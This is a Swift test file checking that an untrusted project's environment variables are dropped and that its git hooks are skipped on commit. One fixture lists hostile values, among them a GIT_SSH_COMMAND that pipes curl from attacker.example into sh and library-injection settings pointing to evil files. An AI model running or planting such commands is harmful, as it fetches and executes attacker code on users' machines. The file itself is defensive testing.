import Foundation
import Testing
@testable import AbydosKit

/// Whether a project's own environment reaches anything.
///
/// The names are the ones the report named and the ones like them: each is a
/// command something runs, or a choice about what gets loaded into a process.
struct ProjectEnvironmentTests {
	@Test func anUntrustedProjectsVariablesReachNothing() {
		let supplied = [
			"SOPS_AGE_KEY_CMD": "curl attacker.example/key",
			"GIT_SSH_COMMAND": "sh -c 'curl attacker.example | sh'",
			"GIT_EXTERNAL_DIFF": "/tmp/whatever",
			"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib",
			"NODE_OPTIONS": "--require /tmp/evil.js",
		]
		#expect(ProjectEnvironment.allowed(supplied, trusted: false).isEmpty)
	}

	@Test func aTrustedProjectsVariablesAreItsOwnBusiness() {
		let supplied = ["API_HOST": "localhost", "SOPS_AGE_KEY_FILE": "keys.txt"]
		#expect(ProjectEnvironment.allowed(supplied, trusted: true) == supplied)
	}

	/// **Dropped, not filtered**: an ordinary-looking variable goes with the
	/// dangerous ones, because telling them apart is the thing that cannot be
	/// kept correct.
	@Test func nothingIsKeptBecauseItLooksHarmless() {
		#expect(ProjectEnvironment.allowed(["LANG": "en_GB.UTF-8"], trusted: false).isEmpty)
	}

	@Test func whatWasDroppedIsSayable() {
		let said = ProjectEnvironment.dropped(
			["SOPS_AGE_KEY_CMD": "x", "API_HOST": "y"], trusted: false
		)
		#expect(said?.contains("API_HOST, SOPS_AGE_KEY_CMD") == true)
		#expect(said?.contains("not trusted") == true)
	}

	@Test func nothingIsSaidWhenThereWasNothingToDrop() {
		#expect(ProjectEnvironment.dropped([:], trusted: false) == nil)
		#expect(ProjectEnvironment.dropped(["A": "b"], trusted: true) == nil)
	}
}

/// What a commit does about the project's hooks.
struct UntrustedCommitTests {
	@Test func atrustedProjectRunsItsHooks() {
		let arguments = GitWorkingCopy.commitArguments(
			subject: "s", body: "", amend: false, runsHooks: true
		)
		#expect(!arguments.contains("--no-verify"))
	}

	@Test func anUntrustedProjectDeclinesThem() {
		let arguments = GitWorkingCopy.commitArguments(
			subject: "s", body: "", amend: false, runsHooks: false
		)
		#expect(arguments.contains("--no-verify"))
		// Before `--amend` and before the message, which is where git wants it
		// and where it stays out of the two `-m` flags.
		#expect(arguments.firstIndex(of: "--no-verify")! < arguments.firstIndex(of: "-m")!)
	}

	/// The wording is the requirement: the danger of `--no-verify` is somebody
	/// not knowing it happened.
	@Test func whatIsSaidNamesTheHooksAndTheWayOut() {
		#expect(GitWorkingCopy.hooksDeclined.contains("hooks did not run"))
		#expect(GitWorkingCopy.hooksDeclined.contains("Trust it"))
	}
}
